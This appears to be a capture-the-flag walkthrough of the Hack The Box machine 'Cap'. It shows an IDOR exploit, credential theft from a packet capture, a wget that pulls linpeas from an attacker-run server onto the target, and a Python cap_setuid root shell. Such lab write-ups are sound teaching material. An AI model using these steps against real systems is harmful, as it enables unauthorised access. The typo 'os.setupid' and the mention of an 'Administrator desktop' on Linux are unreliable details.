# HTB - Cap

Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.

## 1. Initial Enumeration

The first thing I did was to perform an Nmap scan against the target machine to identify which ports were open, running services, and potential vulnerabilities.

```bash
nmap -sV -A 10.129.11.225
```

### Scan Explanation

`-sV` enables version detection, allowing Nmap to identify service versions running on open ports.
`-A` enables aggressive scanning, which includes OS detection, version detection, script scanning, and traceroute in a single command.

This type of scan provides a more detailed overview of the target compared to a basic service scan. It is particularly useful during the initial enumeration phase, as it helps identify not only running services and their versions, but also potential misconfigurations and attack vectors that can be further investigated.

The tradeoff is that `-A` is more intrusive and noisy compared to standard enumeration scans, but it significantly increases the amount of actionable information gathered early in the assessment.

This type of scan is useful during the initial reconnaissance phase because it provides a quick overview of the target system and helps identify potential attack vectors.

### Scan Results

<img width="939" height="401" alt="image" src="https://github.com/user-attachments/assets/a48e8a6d-1f6c-4d42-b1e0-e322388b1271" />

## 2. Service Enumeration

From the initial Nmap scan, port 80 was identified as open, indicating that a web server is running on the target.

I proceeded to manually inspect the website in order to gather more information and understand the application running on the server.

<img width="1901" height="941" alt="image" src="https://github.com/user-attachments/assets/0b7db5b4-d023-4025-b7ef-b7494241dac4" />

After navigating through the website to see what information I could find, I found a Download button under the Dashboard link. The download file is `.pcap` file

<img width="1908" height="935" alt="image" src="https://github.com/user-attachments/assets/b573dd0c-e62f-4662-94f3-78244c678882" />

`.pcap` (Packet Capture) file contains captured network traffic and can be analyzed using tools such as Wireshark or tcpdump. It provides visibility into the communication between hosts and can reveal valuable information such as credentials, file transfers, DNS requests, and other network activity.

The downloaded capture was available at a URL containing a numeric identifier. Since the identifier appeared predictable, I modified the value from 1 to 0 and gained access to another user's packet capture. This is an example of an Insecure Direct Object Reference (IDOR), where objects can be accessed directly without proper authorization checks.

<img width="1892" height="902" alt="image" src="https://github.com/user-attachments/assets/fcdccbd1-8fea-4eea-ad55-316bedd003ec" />

After taking a closer look on `1.pcap` file, not much information was found.

<img width="1904" height="937" alt="image" src="https://github.com/user-attachments/assets/8c30ef36-2320-4ca4-9e0b-175de63d9808" />

After reviewing the `1.pcap` file, it looks more promising.

<img width="1903" height="934" alt="image" src="https://github.com/user-attachments/assets/66e6920d-30eb-4f88-971d-e27545a9b6f0" />

After filtering the protocols on only FTP, I found what I was looking for, credentials.

<img width="1898" height="882" alt="image" src="https://github.com/user-attachments/assets/e1e3667d-d99a-452c-ae18-00c1287c4900" />

In this case, the .pcap file was downloaded from the packet capture functionality available on the target machine. After opening the file in Wireshark and reviewing the captured traffic, I identified FTP communication containing plaintext credentials. Since FTP does not encrypt authentication data, the username and password were visible within the network capture and could be used to gain access to the system.

### FTP

After getting the login credential information from the `0.pcap` file, I decided to try to login to FTP and I found the first flag.

<img width="664" height="349" alt="image" src="https://github.com/user-attachments/assets/dedb5582-d1ec-4adb-9088-0f181cfdc8eb" />

### SSH

The recovered credentials were also valid for SSH access, providing a more stable shell on the target.

<img width="887" height="869" alt="image" src="https://github.com/user-attachments/assets/36ca0f2c-1b0d-4404-afb7-c2e4a61e35f7" />

## 3. Privilege Escalation

To be able to do this step I downloaded linpeas.sh from https://linpeas.org and followd the steps:
1. `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`
2. `chmod +x linpeas.sh`

To get `linpeas.sh` to the target, I opened a new terminal and created a python server.

<img width="745" height="85" alt="image" src="https://github.com/user-attachments/assets/fec8aa4a-6bf5-4989-881e-464ea8285325" />

On the target, I downloaded `linepeas.sh` by typing the command:

```bash
wget 10.10.15.8:8080/linpeas.sh
```

<img width="1879" height="274" alt="image" src="https://github.com/user-attachments/assets/5d952859-ca0e-4a46-ba96-659017a15e76" />

Now I had to make it as an executable and I achieved it by doing:

```bash
chmod +x linpeas.sh
```

<img width="349" height="55" alt="image" src="https://github.com/user-attachments/assets/72e04ad8-cf89-4936-a8d8-e37b15e8475a" />

To run it, type:

```bash
./linpeas.sh
```
After completion and going through all the information received, I found this.

<img width="1897" height="706" alt="image" src="https://github.com/user-attachments/assets/4bc7af18-5118-433b-ab72-155700f065d0" />

LinPEAS revealed that Python 3.8 had the `cap_setuid` capability assigned. This capability allows a process to change its effective user ID, making it possible to spawn a root shell if abused.

<img width="629" height="80" alt="image" src="https://github.com/user-attachments/assets/5eda1493-9807-4063-b385-8b35f4b62fbc" />

So to see if this acutally works, the decision to try it out was made by the following commands:

1. `/usr/bin/python3.8`
2. `import os`
3. `os.setupid(0)`
4. `os.system("/bin/bash")`
5. `whoami`

<img width="721" height="222" alt="image" src="https://github.com/user-attachments/assets/70138e95-7aab-4261-b880-b0089ee13d8b" />

## 4. Flags

### User Flag

After gaining initial access to the system, I located and retrieved the user flag.

<img width="664" height="349" alt="image" src="https://github.com/user-attachments/assets/92e3bdac-f00b-410a-ad4a-8b3663845e61" />

### Root Flag

After successfully escalating privileges to root, I retrieved the root flag from the Administrator desktop.

<img width="220" height="91" alt="image" src="https://github.com/user-attachments/assets/97aa9aa0-781a-4d13-bffd-773cf5720fbd" />

## 5. Lessons Learned

How to identify and exploit an Insecure Direct Object Reference (IDOR) vulnerability.
How packet capture files can reveal sensitive information when insecure protocols such as FTP are used.
How to analyze network traffic using Wireshark.
The risks of transmitting credentials in cleartext.
How Linux capabilities can introduce privilege escalation opportunities.
How the cap_setuid capability can be abused to obtain root privileges.
